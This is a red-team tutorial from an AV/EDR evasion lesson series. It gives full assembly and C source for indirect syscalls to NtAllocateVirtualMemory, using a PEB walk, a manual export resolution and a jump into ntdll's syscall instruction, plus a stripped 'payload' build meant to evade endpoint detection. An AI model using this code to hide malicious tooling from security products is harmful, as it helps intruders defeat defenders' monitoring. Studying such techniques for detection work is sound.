# Indirect Syscall: NtAllocateVirtualMemory — No API Dependencies Edition

> **Series:** AV/EDR Evasion Lessons
> **Author:** Piyusha Akash (0x3xp) — Low-Level Engineer · Red Team Operator
> **Website:** [https://0x3xp.github.io](https://0x3xp.github.io)
> **Blog:** [https://0x3xp.github.io/blog](https://0x3xp.github.io/blog)
> **Academy:** [https://0x3xp.github.io/academy](https://0x3xp.github.io/academy)
> **GitHub:** [https://github.com/0x3xp](https://github.com/0x3xp)
> **LinkedIn:** [https://linkedin.com/in/piyushaakash](https://linkedin.com/in/piyushaakash)
> **Contact:** contact.piyushaakash@gmail.com

---

## Introduction

Modern AV and EDR products hook userland APIs — they patch the prologue of functions inside `ntdll.dll` to redirect execution into their own inspection engine before the call ever reaches the kernel. The moment you call `VirtualAlloc`, `WriteProcessMemory`, or anything that eventually bottoms out in `ntdll`, a hooked EDR can see every argument you pass, flag your process, and terminate it.

The standard counter-technique is a **direct syscall**: you copy the `mov r10, rcx / mov eax, <SSN> / syscall` stub into your own binary and invoke the kernel directly, bypassing ntdll entirely. This defeats inline hook detection — but opens a new problem. EDRs running at the kernel level watch for `syscall` instructions executing from memory regions not backed by a known image on disk. If your code emits a `syscall` from an anonymous page, that alone can be a detection signal.

**Indirect syscalls** are the answer. Instead of emitting your own `syscall` instruction, you set `EAX` to the correct System Service Number (SSN), then **jump into ntdll's own `syscall` instruction** — one that lives inside a legitimate, signed, on-disk image. From the kernel's perspective the syscall originates from ntdll, exactly as expected.

This lesson builds a complete indirect syscall stub for `NtAllocateVirtualMemory` from scratch:

- Walk the **PEB** in raw x64 assembly to find ntdll's base — no `GetModuleHandleA`
- Resolve the function address via a **manual PE export table walk** — no `GetProcAddress`
- Extract the **SSN** dynamically from the ntdll stub at runtime
- Jump into **ntdll's own `syscall` gadget** — not ours

No external dependencies. No usermode API fingerprint.

---

## Two Builds — Debug and Clean

This lesson ships two versions of `syscalls.c`. Build and study both.

```
syscalls_debug.c   — has printf, getchar, string.h
                     build this first, run it, read the output,
                     understand what each value means

syscalls.c         — no printf, no getchar, no CRT
                     this is the real payload version
                     minimal import table, production-ready
```

> **Why two?**
> `printf` and `getchar` drag in the entire MSVC CRT runtime — 60+ imports from `kernel32.dll` that you never wrote. They exist only for debugging. A real payload has none of that. The debug build helps you learn; the clean build is what you actually ship.

---

## Project Structure

```
indirect-syscall/
├── ntdll.asm            ; PEB walk → GetNtdllBase (MASM x64)
├── syscalls-masm.asm    ; Indirect syscall stub for NtAllocateVirtualMemory
├── syscalls.h           ; NtAllocateVirtualMemory extern declaration
├── syscalls_debug.c     ; Debug version — printf output, CRT allowed
└── syscalls.c           ; Clean version — no CRT, no debug strings
```

---

## Copyright Headers

Every file in this project carries the following header. Attribution is required for derivative works.

**MASM files** (`;` syntax):

```asm
; =============================================================================
; Project  : Indirect Syscall - No API Dependencies Edition
; File     : ntdll.asm / syscalls-masm.asm
; Author   : Piyusha Akash (0x3xp)
; Website  : https://0x3xp.github.io
; Blog     : https://0x3xp.github.io/blog
; Academy  : https://0x3xp.github.io/academy
; GitHub   : https://github.com/0x3xp
; Series   : AV/EDR Evasion Lessons
; WARNING  : For authorized and educational use only.
;            The author is not responsible for misuse.
; License  : Educational use only. Attribution required for derivative works.
;            Unauthorized redistribution or commercial use is prohibited.
; =============================================================================
```

**C files** (`//` syntax):

```c
// =============================================================================
// Project  : Indirect Syscall - No API Dependencies Edition
// File     : syscalls.c / syscalls.h
// Author   : Piyusha Akash (0x3xp)
// Website  : https://0x3xp.github.io
// Blog     : https://0x3xp.github.io/blog
// Academy  : https://0x3xp.github.io/academy
// GitHub   : https://github.com/0x3xp
// Series   : AV/EDR Evasion Lessons
// WARNING  : For authorized and educational use only.
//            The author is not responsible for misuse.
// License  : Educational use only. Attribution required for derivative works.
//            Unauthorized redistribution or commercial use is prohibited.
// =============================================================================
```

---

## Concepts You Need First

### The Windows Syscall ABI

Every NT function follows the same pattern at the bottom of ntdll:

```
NtAllocateVirtualMemory:
    mov  r10, rcx          ; save RCX — syscall clobbers it
    mov  eax, <SSN>        ; System Service Number into EAX
    test byte ptr [SharedUserData+0x308], 1
    jne  short KiFastSystemCallRet
    syscall                ; enter the kernel
    ret
```

The kernel reads `EAX` to dispatch to the correct NT routine. That number changes between Windows versions and even minor updates — it must be discovered at runtime.

### Why Not `GetModuleHandleA`?

`GetModuleHandleA` is a Win32 API in `kernel32.dll`. Calling it generates userland telemetry — EDRs hook it because it is a common first step in shellcode. Walking the PEB manually operates entirely in memory without issuing any API call.

### Why Not `GetProcAddress`?

Same reason. `GetProcAddress` is a `kernel32` export, it is hooked, and it shows up in your import table. Walking the PE export table yourself is lower noise and leaves no import table footprint.

### The PEB Loader List

The PEB lives at `GS:[0x60]` on 64-bit Windows. At offset `0x18` sits a pointer to `PEB_LDR_DATA`, which chains every loaded module via `InMemoryOrderModuleList`. The order is typically:

1. The executable itself
2. `ntdll.dll`
3. `kernel32.dll`

Two `Flink` hops from the list head lands on ntdll's `LDR_DATA_TABLE_ENTRY`. Offset `0x20` from there gives `DllBase`.

### Direct vs. Indirect Syscall

| | Direct Syscall | Indirect Syscall |
|---|---|---|
| Where does `syscall` execute? | Your binary (anonymous page) | ntdll (signed image) |
| Bypasses userland hooks? | Yes | Yes |
| Call-stack origin check? | Suspicious | Clean — looks like ntdll |
| Kernel ETW-TI risk | Higher | Lower |

---

## File 1 — `ntdll.asm`

```asm
; =============================================================================
; Project  : Indirect Syscall - No API Dependencies Edition
; File     : ntdll.asm
; Author   : Piyusha Akash (0x3xp)
; Website  : https://0x3xp.github.io
; Blog     : https://0x3xp.github.io/blog
; Academy  : https://0x3xp.github.io/academy
; GitHub   : https://github.com/0x3xp
; Series   : AV/EDR Evasion Lessons
; WARNING  : For authorized and educational use only.
;            The author is not responsible for misuse.
; License  : Educational use only. Attribution required for derivative works.
;            Unauthorized redistribution or commercial use is prohibited.
; =============================================================================
;
; Assemble with: ml64 /c ntdll.asm

OPTION CASEMAP:NONE

.CODE

GetNtdllBase PROC PUBLIC
    xor     rax, rax
    mov     rax, GS:[60h]           ; PEB  (TEB+0x60 on x64)
    mov     rax, [rax + 18h]        ; PEB->Ldr  (PEB_LDR_DATA*)
    mov     rax, [rax + 20h]        ; Ldr->InMemoryOrderModuleList.Flink (exe)
    mov     rax, [rax]              ; .Flink again (ntdll)
    mov     rax, [rax + 20h]        ; LDR_DATA_TABLE_ENTRY.DllBase
    ret
GetNtdllBase ENDP

END
```

### Instruction Breakdown

| Instruction | What it does |
|---|---|
| `xor rax, rax` | Zero RAX cleanly |
| `mov rax, GS:[60h]` | Read `TEB.ProcessEnvironmentBlock` — PEB pointer |
| `mov rax, [rax + 18h]` | Dereference `PEB.Ldr` → `PEB_LDR_DATA*` |
| `mov rax, [rax + 20h]` | `InMemoryOrderModuleList.Flink` → first entry (the exe) |
| `mov rax, [rax]` | Follow `.Flink` → second entry (ntdll) |
| `mov rax, [rax + 20h]` | `LDR_DATA_TABLE_ENTRY.DllBase` → ntdll base address |
| `ret` | Return base in RAX (Windows x64 ABI) |

> **Why offset `0x20` for DllBase?**
> We traverse `InMemoryOrderModuleList` so our pointer sits `0x10` bytes into `LDR_DATA_TABLE_ENTRY` (past the two `LIST_ENTRY` pointers). `DllBase` is at structural offset `0x30`, but relative to our pointer that is `0x30 - 0x10 = 0x20`.

---

## File 2 — `syscalls-masm.asm`

```asm
; =============================================================================
; Project  : Indirect Syscall - No API Dependencies Edition
; File     : syscalls-masm.asm
; Author   : Piyusha Akash (0x3xp)
; Website  : https://0x3xp.github.io
; Blog     : https://0x3xp.github.io/blog
; Academy  : https://0x3xp.github.io/academy
; GitHub   : https://github.com/0x3xp
; Series   : AV/EDR Evasion Lessons
; WARNING  : For authorized and educational use only.
;            The author is not responsible for misuse.
; License  : Educational use only. Attribution required for derivative works.
;            Unauthorized redistribution or commercial use is prohibited.
; =============================================================================
;
; Assemble with: ml64 /c syscalls-masm.asm

EXTERN wNtAllocateVirtualMemory:DWORD   ; SSN — set at runtime by syscalls.c
EXTERN sysNtAllocateVirtualMemory:QWORD ; ntdll syscall gadget — set at runtime

.CODE

NtAllocateVirtualMemory PROC
    mov  r10, rcx                               ; Windows x64 ABI: mirror RCX into R10
    mov  eax, wNtAllocateVirtualMemory          ; load SSN into EAX
    jmp  QWORD PTR [sysNtAllocateVirtualMemory] ; jump INTO ntdll's own syscall instruction
NtAllocateVirtualMemory ENDP

END
```

### Why Three Instructions?

**`mov r10, rcx`** — First argument comes in RCX. The `syscall` instruction clobbers RCX (saves RIP there for the return path). The kernel reads argument 1 from R10 — Windows ABI convention.

**`mov eax, wNtAllocateVirtualMemory`** — EAX must hold the SSN when `syscall` fires. Loaded from a global DWORD resolved at runtime.

**`jmp QWORD PTR [sysNtAllocateVirtualMemory]`** — We do not emit our own `syscall`. We jump into ntdll's `syscall` instruction at offset `+0x12`. The kernel's call stack shows `ntdll!NtAllocateVirtualMemory+0x12` — because ntdll literally executed it.

---

## File 3 — `syscalls.h`

```c
// =============================================================================
// Project  : Indirect Syscall - No API Dependencies Edition
// File     : syscalls.h
// Author   : Piyusha Akash (0x3xp)
// Website  : https://0x3xp.github.io
// Blog     : https://0x3xp.github.io/blog
// Academy  : https://0x3xp.github.io/academy
// GitHub   : https://github.com/0x3xp
// Series   : AV/EDR Evasion Lessons
// WARNING  : For authorized and educational use only.
//            The author is not responsible for misuse.
// License  : Educational use only. Attribution required for derivative works.
//            Unauthorized redistribution or commercial use is prohibited.
// =============================================================================

#ifndef _SYSCALLS_H
#define _SYSCALLS_H

#include <windows.h>

typedef long      NTSTATUS;  // NT status code
typedef NTSTATUS* PNTSTATUS; // Pointer to NTSTATUS

extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE     ProcessHandle,
    PVOID*     BaseAddress,
    ULONG_PTR  ZeroBits,
    PSIZE_T    RegionSize,
    ULONG      AllocationType,
    ULONG      Protect
);

#endif
```

---

## File 4a — `syscalls_debug.c` (Debug Build)

> Build this first. Run it. Read every printed value. Understand what the SSN is, where the syscall gadget lives, what address got allocated. Then move to the clean build.

```c
// =============================================================================
// Project  : Indirect Syscall - No API Dependencies Edition
// File     : syscalls_debug.c  (DEBUG VERSION — printf enabled)
// Author   : Piyusha Akash (0x3xp)
// Website  : https://0x3xp.github.io
// Blog     : https://0x3xp.github.io/blog
// Academy  : https://0x3xp.github.io/academy
// GitHub   : https://github.com/0x3xp
// Series   : AV/EDR Evasion Lessons
// WARNING  : For authorized and educational use only.
//            The author is not responsible for misuse.
// License  : Educational use only. Attribution required for derivative works.
//            Unauthorized redistribution or commercial use is prohibited.
// =============================================================================
//
// Compile:  cl /c /Fo:syscalls_c.obj syscalls_debug.c
// Assemble: ml64 /c syscalls-masm.asm
//           ml64 /c ntdll.asm
// Link:     cl syscalls_c.obj syscalls-masm.obj ntdll.obj /Fe:syscalls_debug.exe

#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include "syscalls.h"

DWORD    wNtAllocateVirtualMemory;
UINT_PTR sysNtAllocateVirtualMemory;

extern PVOID GetNtdllBase();

// Manual PE export table walk — no GetProcAddress
UINT_PTR ManualGetProcAddress(PVOID moduleBase, const char* funcName) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dos->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)moduleBase +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD* names    = (DWORD*)((BYTE*)moduleBase + exports->AddressOfNames);
    WORD*  ordinals = (WORD*) ((BYTE*)moduleBase + exports->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)((BYTE*)moduleBase + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)moduleBase + names[i]);
        if (strcmp(name, funcName) == 0)
            return (UINT_PTR)moduleBase + funcs[ordinals[i]];
    }
    return 0;
}

int main() {
    printf("=== Indirect Syscall NtAllocateVirtualMemory ===\n\n");

    PVOID  buffer = NULL;
    SIZE_T size   = 0x1000;

    // Step 1: PEB walk — no GetModuleHandleA
    PVOID ntdllBase = GetNtdllBase();
    printf("[*] ntdll base:                    %p\n", ntdllBase);

    // Step 2: Manual export walk — no GetProcAddress
    UINT_PTR pNtAllocateVirtualMemory =
        ManualGetProcAddress(ntdllBase, "NtAllocateVirtualMemory");
    printf("[*] NtAllocateVirtualMemory addr:  %p\n", (PVOID)pNtAllocateVirtualMemory);

    // Step 3: Extract SSN from ntdll stub at offset +4
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
    printf("[*] SSN (System Service Number):   0x%02X\n", wNtAllocateVirtualMemory);

    // Step 4: Point to ntdll's syscall gadget at offset +0x12
    sysNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
    printf("[*] Syscall gadget addr:           %p\n\n", (PVOID)sysNtAllocateVirtualMemory);

    // Step 5: Fire the indirect syscall via our MASM stub
    NTSTATUS status = NtAllocateVirtualMemory(
        (HANDLE)-1,     // current process pseudohandle — no GetCurrentProcess()
        &buffer,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status == 0) {
        printf("[+] Success! Allocated %zu bytes at %p\n", size, buffer);
    } else {
        printf("[-] Failed: NTSTATUS 0x%08X\n", (unsigned int)status);
    }

    printf("\nPress enter to exit...");
    getchar();
    return 0;
}
```

---

## File 4b — `syscalls.c` (Clean Payload Build)

> No `printf`. No `getchar`. No CRT. This is what a real payload looks like. Run `dumpbin /IMPORTS syscalls.exe` after building and compare the import table to the debug build.

```c
// =============================================================================
// Project  : Indirect Syscall - No API Dependencies Edition
// File     : syscalls.c  (CLEAN VERSION — no CRT, no debug strings)
// Author   : Piyusha Akash (0x3xp)
// Website  : https://0x3xp.github.io
// Blog     : https://0x3xp.github.io/blog
// Academy  : https://0x3xp.github.io/academy
// GitHub   : https://github.com/0x3xp
// Series   : AV/EDR Evasion Lessons
// WARNING  : For authorized and educational use only.
//            The author is not responsible for misuse.
// License  : Educational use only. Attribution required for derivative works.
//            Unauthorized redistribution or commercial use is prohibited.
// =============================================================================
//
// Compile:  cl /c /GS- /sdl- /Gy /GL /O2 /Fo:syscalls_c.obj syscalls.c
// Assemble: ml64 /c syscalls-masm.asm
//           ml64 /c ntdll.asm
// Link:     cl syscalls_c.obj syscalls-masm.obj ntdll.obj /Fe:syscalls.exe
//           /link /NODEFAULTLIB /ENTRY:main /SUBSYSTEM:CONSOLE
//           /OPT:REF /OPT:ICF /LTCG

#include <Windows.h>
#include "syscalls.h"

DWORD    wNtAllocateVirtualMemory;
UINT_PTR sysNtAllocateVirtualMemory;

extern PVOID GetNtdllBase();

// No CRT strcmp — own implementation
int MyStrCmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return *a - *b;
}

// Manual PE export table walk — no GetProcAddress
UINT_PTR ManualGetProcAddress(PVOID moduleBase, const char* funcName) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dos->e_lfanew);

    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)moduleBase +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );

    DWORD* names    = (DWORD*)((BYTE*)moduleBase + exports->AddressOfNames);
    WORD*  ordinals = (WORD*) ((BYTE*)moduleBase + exports->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)((BYTE*)moduleBase + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)moduleBase + names[i]);
        if (MyStrCmp(name, funcName) == 0)
            return (UINT_PTR)moduleBase + funcs[ordinals[i]];
    }
    return 0;
}

int main() {
    PVOID  buffer = NULL;
    SIZE_T size   = 0x1000;

    // PEB walk — no GetModuleHandleA
    PVOID ntdllBase = GetNtdllBase();

    // Manual export walk — no GetProcAddress
    UINT_PTR pNtAllocateVirtualMemory =
        ManualGetProcAddress(ntdllBase, "NtAllocateVirtualMemory");

    // SSN from ntdll stub byte at offset +4
    wNtAllocateVirtualMemory   = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];

    // ntdll's own syscall gadget at offset +0x12
    sysNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

    NtAllocateVirtualMemory(
        (HANDLE)-1,     // current process — no GetCurrentProcess()
        &buffer,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    return 0;
}
```

---

## SSN Extraction — Byte by Byte

The unhooked ntdll stub in memory:

```
Offset   Bytes              Disassembly
+0x00    4C 8B D1           mov r10, rcx
+0x03    B8 xx 00 00 00     mov eax, <SSN>    <- xx = SSN byte
+0x08    F6 04 25 ...       test [SharedUserData+0x308], 1
+0x12    0F 05              syscall           <- we jump here
+0x14    C3                 ret
```

- `pNtAllocateVirtualMemory + 4` lands on the SSN byte
- `pNtAllocateVirtualMemory + 0x12` lands on the `syscall` opcode (`0F 05`)

---

## Build Commands

### Debug Build

```bat
cl /c /Fo:syscalls_c.obj syscalls_debug.c
ml64 /c ntdll.asm
ml64 /c syscalls-masm.asm
cl syscalls_c.obj syscalls-masm.obj ntdll.obj /Fe:syscalls_debug.exe
```

### Clean Payload Build

```bat
cl /c /GS- /sdl- /Gy /GL /O2 /Fo:syscalls_c.obj syscalls.c
ml64 /c ntdll.asm
ml64 /c syscalls-masm.asm
cl syscalls_c.obj syscalls-masm.obj ntdll.obj ^
  /Fe:syscalls.exe ^
  /link ^
  /NODEFAULTLIB ^
  /ENTRY:main ^
  /SUBSYSTEM:CONSOLE ^
  /OPT:REF ^
  /OPT:ICF ^
  /LTCG
```

---

## Compare the Import Tables

After building both, run:

```bat
dumpbin /IMPORTS syscalls_debug.exe
dumpbin /IMPORTS syscalls.exe
```

**Debug build** — 60+ CRT imports you never wrote:

```
KERNEL32.dll
    HeapAlloc
    FlsAlloc
    InitializeCriticalSectionEx
    GetModuleHandleW
    GetCommandLineA
    ... (CRT startup noise)
```

**Clean build** — empty or near-empty:

```
  (no imports)
```

That difference is the lesson. Same technique, same kernel call, completely different static footprint. The debug build is for understanding. The clean build is for operating.

---

## Execution Flow

```
main()
  |
  |-> GetNtdllBase()              [ntdll.asm - pure assembly]
  |     GS:[60h] -> PEB
  |     -> PEB.Ldr
  |     -> InMemoryOrderModuleList.Flink (exe)
  |     -> .Flink (ntdll)
  |     -> LDR_DATA_TABLE_ENTRY.DllBase
  |     return ntdll base in RAX
  |
  |-> ManualGetProcAddress()      [syscalls.c - raw PE parse]
  |     Parse IMAGE_DOS_HEADER -> IMAGE_NT_HEADERS
  |     -> IMAGE_EXPORT_DIRECTORY
  |     Walk AddressOfNames[]
  |     Match "NtAllocateVirtualMemory"
  |     return function address
  |
  |-> Extract SSN  @ addr+4       -> wNtAllocateVirtualMemory
  |-> Save gadget  @ addr+0x12    -> sysNtAllocateVirtualMemory
  |
  +-> NtAllocateVirtualMemory()   [syscalls-masm.asm]
        mov r10, rcx
        mov eax, wNtAllocateVirtualMemory
        jmp [sysNtAllocateVirtualMemory]
              |
              +-> ntdll.dll: 0F 05 syscall -> NT kernel
                  NTSTATUS 0x00000000 = success
```

---

## What Is Still Detectable

Honest notes — students should know where the gaps are:

- **`"NtAllocateVirtualMemory"` string is plaintext** in the binary — static scanners find it easily. Next lesson: API hashing to hide it.
- **SSN extraction assumes an unhooked stub** — a patched EDR trampoline at byte 0 breaks offset-based extraction. Solution: map a clean ntdll from disk and parse that instead.
- **`(HANDLE)-1` replaces `GetCurrentProcess()`** — already done here, correct.
- **Manual export walk replaces `GetProcAddress`** — already done here.
- **Call-stack stitching** — advanced EDRs reconstruct the full call stack. Combining indirect syscalls with stack spoofing raises the bar further. Future lesson.

Each gap is the next lesson.

---

## References

- [MSDN — NtAllocateVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory)
- [Vergilius Project — Windows kernel structures](https://www.vergiliusproject.com/kernels/x64)
- [Artemis — Syscall Forge Framework by 0x3xp](https://github.com/0x3xp/Artemis)
- [Native Adversary Framework by 0x3xp](https://github.com/0x3xp/Native-Adversary-Framework)
- [0x3xp Academy](https://0x3xp.github.io/academy)
- [0x3xp Blog](https://0x3xp.github.io/blog)

---

> *All research conducted for educational purposes under authorized scope.*
> *© Piyusha Akash (0x3xp) — Attribution required for derivative works.*